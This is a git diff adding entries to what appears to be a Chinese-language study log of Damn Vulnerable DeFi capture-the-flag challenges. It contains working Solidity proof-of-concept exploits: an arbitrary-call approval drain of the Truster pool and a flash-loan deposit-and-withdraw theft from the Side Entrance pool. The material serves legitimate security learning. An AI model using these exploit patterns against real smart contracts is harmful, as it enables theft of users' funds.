@@ -338,6 +338,7 @@ function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amoun
 ```
 
 ### 2024.09.03
+#### native receiver
 
 #### native-receiver
 
@@ -506,5 +507,118 @@ POC：
 
 ### 2024.09.04
 
+#### Truster
 
+题目要求一个交易拿走所有token
+
+```
+contract TrusterLenderPool is ReentrancyGuard {
+    using Address for address;
+
+    DamnValuableToken public immutable token;
+
+    error RepayFailed();
+
+    constructor(DamnValuableToken _token) {
+        token = _token;
+    }
+
+    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
+        external
+        nonReentrant//不能重入
+        returns (bool)
+    {
+        uint256 balanceBefore = token.balanceOf(address(this));
+        token.transfer(borrower, amount);//
+        target.functionCall(data);//调用任意指定合约
+
+        if (token.balanceOf(address(this)) < balanceBefore) {//如果钱少了会回滚，因此中途不能转钱。所以让本合约去调用token的approve方法，结束flashloan之后再transferfrom
+            revert RepayFailed();
+        }
+
+        return true;
+    }
+}
+```
+
+POC:
+
+```
+    function test_truster() public checkSolvedByPlayer {
+        TrusterCaller t=new TrusterCaller();
+        t.start(address(pool), recovery, address(token));
+    }
+```
+
+```
+contract TrusterCaller{
+    function start(address pool, address rescue,address token)public{
+        bytes memory data = abi.encodeCall(ERC20.approve,(address(this),1e24)); //1 million=6+18
+        TrusterLenderPool(pool).flashLoan(0,address(this),token,data);
+        DamnValuableToken(token).transferFrom(pool,rescue,1e24);
+    }
+}
+```
+
+
+
+
+
+#### side entrace
+
+题目
+
+```
+    function deposit() external payable {
+        unchecked {
+            balances[msg.sender] += msg.value;
+        }
+        emit Deposit(msg.sender, msg.value);
+    }
+
+    function withdraw() external {
+        uint256 amount = balances[msg.sender];
+
+        delete balances[msg.sender];
+        emit Withdraw(msg.sender, amount);
+
+        SafeTransferLib.safeTransferETH(msg.sender, amount);
+    }
+
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        if (address(this).balance < balanceBefore) {//最后检查的时候，token需要在合约里，因此我们可以闪电贷取走所有钱之后deposit进去。通过检查后再取出。
+            revert RepayFailed();
+        }
+    }
+```
+
+POC :
+
+```
+contract SideCaller{
+    
+    SideEntranceLenderPool pool;
+
+    function start(address addr,address recovery)public{
+        pool=SideEntranceLenderPool(addr);
+        pool.flashLoan(1000e18);
+        pool.withdraw();
+        payable (recovery).transfer(1000e18);
+    }
+    function execute() external payable{
+        pool.deposit{value:1000e18}();
+    }
+    receive()external payable{
+
+    }
+}
+```
+### 2024.09.05
+
+
+### 2024.09.06
 <!-- Content_END -->
